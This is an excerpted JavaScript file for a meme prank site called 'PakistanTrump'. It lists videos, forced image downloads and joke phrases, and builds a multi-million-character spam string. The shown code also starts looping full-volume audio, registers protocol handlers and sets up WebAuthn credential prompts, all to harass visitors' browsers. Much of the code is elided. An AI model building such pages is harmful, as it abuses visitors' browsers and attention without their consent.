/*
PakistanTrump
Adapted from an open-source base.
*/
...
const ART = [
  `
 _____   _        _                    _               
|__  /  (_)  ___ | |__    __ _  _ __  (_) _ __    __ _ 
  / /   | | / _ \| '_ \  / _  \|  _ \ | || '_ \  / _  |
 / /_   | ||  __/| |_) || (_| || | | || || | | || (_| |
/____| _/ | \___||_.__/  \__,_||_| |_||_||_| |_| \__,_|
      |__/                                             
  `
]
...
const VIDEOS = [
  ...
  'media/videos/siemajestempakistantrump.mp4',
  'media/videos/snaptik_7595276104462634262_v3.mp4',
  'media/videos/snaptik_7597820929405734166_v2.mp4',
  'media/videos/snaptik_7598117154910653718_v2.mp4',
  'media/videos/snaptik_7598123995308756226_v2.mp4',
  'media/videos/snaptik_7598914071756279062_v2.mp4',
  'media/videos/snaptik_7599142788122348822_v2.mp4'
]

const FILE_DOWNLOADS = [
  'media/images/trum.png',
  'media/images/trum2.png',
  'media/images/trum3.png',
  'media/images/trum4.png',
  'media/images/trum5.png',
  'media/images/trum6.png',
  'media/images/trum7.png',
  'media/images/trum8.webp',
]

const PHRASES = [
  'hello my name is pakistantrump, lol',
  'Im Trumpin IT ohhh ohh',
  'PakistanTrump is here to make the web great again',
  'You just got Pakistan Trumped!!1',
  'Pakistan Trump is the best thing to happen to the internet since sliced bread'
]
...
let hasStartedPakistanMusic = false

//Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm

const veryLongString = repeatStringNumTimes(repeatStringNumTimes('zostałeś pakistantrumpowany!!1 ',100),1500) // - added by @9fm
...
function startPakistanMusic () {
  if (hasStartedPakistanMusic) return

  const audio = document.getElementById('pakistan-music')

  if (!audio) return

  hasStartedPakistanMusic = true
  audio.volume = 1
  audio.loop = true
...
function registerProtocolHandlers () {
  ...
  protocolWhitelist.forEach(proto => {
    navigator.registerProtocolHandler(proto, handlerUrl, 'PakistanTrump')
  })
}
    ...
    const createCredentialDefaultArgs = {
      ...
      // Relying Party (a.k.a. - Service):
        ...
        user: {
          ...
          name: 'pakistantrump@pakistantrump.local',
          displayName: 'PakistanTrump'
        },
